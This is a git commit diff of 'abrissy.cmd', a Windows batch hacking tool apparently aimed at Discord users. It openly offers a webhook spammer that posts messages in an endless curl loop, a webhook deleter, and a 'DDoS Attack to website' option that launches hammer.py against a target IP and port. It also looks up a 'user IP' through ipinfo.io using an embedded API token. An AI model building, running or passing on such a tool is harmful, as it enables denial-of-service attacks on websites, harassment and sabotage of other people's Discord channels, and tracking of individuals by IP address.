7272ab1ba240786ad05b4bfa5bf0772f22211adf
torch-studios <131596876+torch-studios@users.noreply.github.com>
2023-12-01 19:17:32 +0100

    Add files via upload

--- abrissy.cmd
+++ abrissy.cmd
@@ -14,78 +14,105 @@ if "%arg%"=="-ws" goto :webhookspammer
 if "%arg%"=="-l7" goto :ddoswebsite 
 if "%arg%"=="-pw" goto :pingwebsite 
 if "%arg%"=="-credits" goto :credits  
+if "%arg%"=="-il" goto :iplookup
+if "%arg%"=="-ws" goto :wifi-scan
+if "%arg%"=="-st" goto :speedtest
+if "%arg%"=="-install-req" setup.bat
 
 echo 
 goto :end
 :end
 endlocal
-
 :hud 
 type log.txt 
 echo.
-echo [37m[[0m[95mABRISSY[0m[37m][0m use -h to get help in Abrissy
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36muse -h to get help in Abrissy[0m
+echo [36mor install requirements by using -install-req[0m
 goto end 
 :help
+echo WIFI INTEGRATIONS
+echo [35m[[0m[37m-ws[0m[35m][0m [95mScan wifi networks[0m
+echo [35m[[0m[37m-l7[0m[35m][0m [95mSend DDoS Attack to website[0m
+echo [35m[[0m[37m-pw[0m[35m][0m [95mGet website IP Adress[0m
+echo [35m[[0m[37m-il[0m[35m][0m [95mGet informations about IP Adress[0m
+echo [35m[[0m[37m-st[0m[35m][0m [95mcheck speedtest[0m
+echo DISCORD INTEGRATIONS 
 echo [35m[[0m[37m-wm[0m[35m][0m [95mSend Discord webhook message.[0m
 echo [35m[[0m[37m-wr[0m[35m][0m [95mRemove Discord webhook.[0m
 echo [35m[[0m[37m-ws[0m[35m][0m [95mSpam webhook[0m
-echo [35m[[0m[37m-l7[0m[35m][0m [95mSend DDoS Attack to website[0m
-echo [35m[[0m[37m-pw[0m[35m][0m [95mGet website IP Adress[0m
-echo _________________________________________________________________________________________
-echo.
+echo OTHER
 echo [35m[[0m[37m-credits[0m[35m][0m [95mThis command shown informations about tool[0m
 
 goto :end
 :webhookspammer 
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter webhook. 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter webhook. [0m
 set /p "webhook=>[95m"[0m
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter message to spam. 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter message to spam. [0m
 set /p "message=>[95m"[0m
 :spam 
 curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
-echo [37m[[0m[95mABRISSY[0m[37m][0m Message sent.
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mMessage sent.
 timeout 1 >nul
 goto spam 
 :webhookremover
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter webhook. 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter webhook. [0m
 set /p "webhook=>[95m"[0m
 curl -X DELETE %webhook%
-echo [37m[[0m[95mABRISSY[0m[37m][0m Webhook has been removed succesful 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mWebhook has been removed succesful [0m
 goto end 
 
 :webhookmessenger
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter webhook. 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter webhook. [0m
 set /p "webhook=>[95m"[0m
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter message to send. 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter message to send. [0m
 set /p "message=>[95m"[0m
 curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
-echo [37m[[0m[95mABRISSY[0m[37m][0m Message has been sent succesful
+echo [37m[[0m[95mABRISSY[0m[37m][0m Message has been sent succesful[0m
 goto end 
 
 :ddoswebsite 
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter website IP Adress (you can get website ip adress by using -pw )
-echo [37m[[0m[95mABRISSY[0m[37m][0m Ctrl + C to stop
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter website IP Adress (you can get website ip adress by using -pw )[0m
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mCtrl + C to stop[0m
 set /p "siteip=>[95m"[0m
-echo [37m[[0m[95mABRISSY[0m[37m][0m Port: 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mPort: [0m
 set /p "siteport=>[95m"[0m
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mAre you sure? (Y/N)[0m
+set /p "yn=>[95m"[0m
+if %yn%==y goto d 
+if %yn%==Y goto d 
+if %yn%==n goto end 
+if %yn%==N goto end 
+:d 
 python hammer.py -s %siteip% -t 135 -p %siteport%
 
 :pingwebsite 
-echo [37m[[0m[95mABRISSY[0m[37m][0m Enter website domain.
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter website domain.[0m
 set /p "website=>[95m"[0m
 for /f "tokens=2 delims=[]" %%a in ('ping -n 1 %website% ^| findstr /i "Pinging"') do (
     set "ip_address=%%a"
 )
 if defined ip_address (
-    echo [37m[[0m[95mABRISSY[0m[37m][0m %website% = %ip_address%
+    echo [37m[[0m[95mABRISSY[0m[37m][0m [36m%website% = %ip_address%[0m
 ) else (
-    echo [37m[[0m[95mABRISSY[0m[37m][0m Cannot get IP from %website%
+    echo [37m[[0m[95mABRISSY[0m[37m][0m [36mCannot get IP from %website%[0m
 )
 goto end
 pause
 
+:iplookup 
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mEnter user IP. [0m
+set /p "ip=>[95m"[0m
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mDetecing...[0m
+curl ipinfo.io/%ip%?token=7ac6b2bcbf4dae
+goto end 
+
+:speedtest 
+st.cmd
+:wifi-scan
+netsh wlan show networks mode=bssid
+goto end
 :credits 
-echo [37m[[0m[95mABRISSY[0m[37m][0m This tool was made by dc: abrissy / https://discord.gg/eWjJdFVf
+echo [37m[[0m[95mABRISSY[0m[37m][0m [36mThis tool was made by dc: abrissy / https://discord.gg/eWjJdFVf[0m
 
 :end
 endlocal
